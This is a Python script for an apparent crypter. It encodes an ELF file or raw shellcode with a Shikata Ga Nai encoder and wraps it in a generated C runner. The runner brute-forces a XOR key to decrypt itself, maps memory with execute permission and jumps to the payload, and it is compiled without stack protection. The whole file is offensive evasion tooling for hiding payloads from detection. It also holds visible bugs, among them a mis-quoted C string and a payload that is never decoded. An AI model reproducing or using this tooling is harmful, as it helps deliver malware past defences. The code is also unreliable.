#!/usr/bin/env python3
import argparse
import os
import subprocess
import sys
import tempfile
import struct
import shutil
import random

# Import the ShikataGaNaiEncoder from our previous module.
# (Assume that the encoder code is in shikata_encoder.py in the same directory.)
try:
    from shikata_ga_nai import ShikataGaNaiEncoder
except ImportError:
    sys.exit("Error: Cannot import shikata_encoder module. Make sure it is in the same directory.")

def detect_arch(elf_file):
    """
    Detect whether the input ELF is 32-bit or 64-bit.
    Uses 'readelf -h' to parse the ELF header.
    Returns "x32" or "x64".
    """
    try:
        out = subprocess.check_output(["readelf", "-h", elf_file], universal_newlines=True)
    except Exception as e:
        sys.exit(f"Error calling readelf: {e}")

    for line in out.splitlines():
        if "Class:" in line:
            if "ELF32" in line:
                return "x32"
            elif "ELF64" in line:
                return "x64"
    sys.exit("Unable to determine ELF class.")

def generate_runner_c(encoded_payload, arch, raw_payload):
    """
    Generate a C source code string for the runner.
    The runner:
      - Contains a marker region between __decrypt_start and __decrypt_end.
      - Contains an embedded encoded payload as a byte array.
      - Has a self-decrypting function (brute-forcing a weak XOR key) that decodes
        the region between markers.
      - Allocates executable memory, copies the decoded payload there, and jumps to it.
    Note: The payload is assumed to be a binary blob produced by our encoder.
    """
    # We embed a magic string into the region so that at runtime the runner
    # can verify that decryption succeeded.
    # The markers __decrypt_start and __decrypt_end delimit the region that will be XOR‑encoded.
    #
    # The runner’s self-decrypt function will iterate keys 0–255, XORing the region
    # and checking if it sees the magic marker "DECO" (which we embed right after __decrypt_start).
    #
    # For simplicity, we assume that the region to encode is the runner’s main code area.
    #
    # The encoded payload is embedded as a C array named encoded_payload.
    #
    # The flag raw_payload determines whether the input was raw shellcode (to be executed directly)
    # or a full ELF (in which case you might wish to call a loader function inside the payload).
    c_code = f'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#define WEAK_KEY 0x42

// Markers for the self-decrypting region.
char __decrypt_start[] = "DECO_START";
char __decrypt_marker[] = "DECO";  // Expected marker after decryption.
char __decrypt_end[]   = 'DECO_END';

// Embedded encoded payload.
unsigned char encoded_payload[] = {{
{', '.join('0x{:02x}'.format(b) for b in encoded_payload)}
}};
size_t payload_size = sizeof(encoded_payload);

// Function prototype for payload execution.
void run_payload();

// Self-decryption routine.
// This function brute-forces the XOR key for the region between __decrypt_start and __decrypt_end.
void self_decrypt_region() {{
    // Calculate the region to decrypt.
    unsigned char *start = (unsigned char *)__decrypt_start;
    unsigned char *end = (unsigned char *)__decrypt_end;
    size_t region_size = end - start;
    int key;
    for (key = 0; key < 256; key++) {{
        // Make a temporary copy of the region.
        unsigned char temp[region_size];
        memcpy(temp, start, region_size);
        // XOR decrypt with candidate key.
        for (size_t i = 0; i < region_size; i++) {{
            temp[i] ^= key;
        }}
        // Check if the decrypted marker (first 4 bytes) matches __decrypt_marker.
        if (memcmp(temp, __decrypt_marker, 4) == 0) {{
            // Found correct key. Now decrypt the region in place.
            for (size_t i = 0; i < region_size; i++) {{
                start[i] ^= key;
            }}
            // Optionally print the found key.
            // printf("Self-decryption key found: 0x%02x\\n", key);
            return;
        }}
    }}
    fprintf(stderr, "Failed to self-decrypt runner region.\\n");
    exit(1);
}}

#if defined(__i386__) || defined(__x86_64__)
__attribute__((naked))
#endif
void runner_entry() {{
    // This function is the entry point for the runner after self-decryption.
    // It allocates executable memory, copies the decoded payload, and transfers control.
    self_decrypt_region();
    // Allocate executable memory for the payload.
    void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        exit(1);
    }}
    memcpy(exec_mem, encoded_payload, payload_size);
    // Flush instruction cache if necessary.
#if defined(__i386__) || defined(__x86_64__)
    __builtin___clear_cache((char*)exec_mem, (char*)exec_mem + payload_size);
#endif
    // Transfer control to the payload.
    void (*payload_func)() = exec_mem;
    payload_func();
    exit(0);
}}

int main(int argc, char *argv[]) {{
    // The runner's self-decrypting region is between __decrypt_start and __decrypt_end.
    // For demonstration purposes, we do nothing else here.
    runner_entry();
    return 0;
}}
'''
    return c_code

def compile_runner(c_source, arch, output_filename):
    """
    Compile the C source code into an ELF file.
    Uses gcc. For x32, adds -m32; for x64, -m64 is assumed.
    Also uses flags to disable stack protection and enable an executable stack.
    """
    tmp_dir = tempfile.mkdtemp(prefix="runner_build_")
    c_file = os.path.join(tmp_dir, "runner.c")
    with open(c_file, "w") as f:
        f.write(c_source)
    gcc_cmd = ["gcc", c_file, "-o", output_filename, "-fno-stack-protector", "-z", "execstack"]
    if arch == "x32":
        gcc_cmd.insert(1, "-m32")
    # For simplicity, we assume gcc is available and works.
    try:
        subprocess.check_call(gcc_cmd)
    except subprocess.CalledProcessError as e:
        shutil.rmtree(tmp_dir)
        sys.exit(f"gcc compilation failed: {e}")
    shutil.rmtree(tmp_dir)

def postprocess_runner(runner_filename):
    """
    Post-process the compiled ELF runner.
    This function opens the runner binary, locates the region between the markers
    "DECO_START" and "DECO_END", and XORs that region with a weak key (0x42).
    The final ELF will not contain the key; the runner will brute-force at runtime.
    For simplicity, this implementation scans the file as bytes.
    """
    with open(runner_filename, "rb") as f:
        data = bytearray(f.read())
    marker_start = b"DECO_START"
    marker_end = b"DECO_END"
    start_idx = data.find(marker_start)
    end_idx = data.find(marker_end)
    if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
        sys.exit("Failed to locate decryption markers in the runner binary.")
    # The region to encrypt is from start_idx to end_idx.
    for i in range(start_idx, end_idx):
        data[i] ^= 0x42  # weak XOR key
    with open(runner_filename, "wb") as f:
        f.write(data)

def main():
    parser = argparse.ArgumentParser(
        description="Builder: Encodes an ELF file using Shikata Ga Nai and builds a self-decrypting Linux runner ELF.",
        epilog=(
            "Usage Examples:\n"
            "  1. Build a runner for a full ELF executable:\n"
            "         python3 builder.py -f input.elf -o final_runner.elf\n\n"
            "  2. Build a runner for raw shellcode (use --raw flag):\n"
            "         python3 builder.py -f shellcode.bin --raw -o final_runner.elf\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-f", "--file", required=True, help="Input ELF file (full executable or raw shellcode)")
    parser.add_argument("-o", "--output", required=True, help="Output ELF file (final runner)")
    parser.add_argument("--raw", action="store_true", help="Indicate that the input file is raw shellcode rather than a full ELF")
    args = parser.parse_args()

    # Detect architecture of the input file.
    arch = detect_arch(args.file) if not args.raw else "x32"  # For raw shellcode, default to x32 (or add a flag)
    print(f"[+] Detected architecture: {arch}")

    # Read input file.
    with open(args.file, "rb") as f:
        payload_data = f.read()

    # Instantiate the encoder (using basic options for now).
    encoder = ShikataGaNaiEncoder(arch=arch)
    # Encode the payload.
    encoded_payload = encoder.encode(payload_data)
    print(f"[+] Encoded payload size: {len(encoded_payload)} bytes")

    # Generate runner C code with the encoded payload embedded.
    runner_c_code = generate_runner_c(encoded_payload, arch, args.raw)
    # Write and compile the runner.
    runner_filename = args.output + ".tmp"
    compile_runner(runner_c_code, arch, runner_filename)
    print("[+] Runner compiled successfully.")

    # Post-process the runner: XOR-encode the designated region.
    postprocess_runner(runner_filename)
    print("[+] Runner post-processed (self-decrypting region XOR-encoded).")

    # Rename/move the temporary runner file to final output.
    shutil.move(runner_filename, args.output)
    print(f"[+] Final runner ELF generated: {args.output}")

if __name__ == "__main__":
    main()
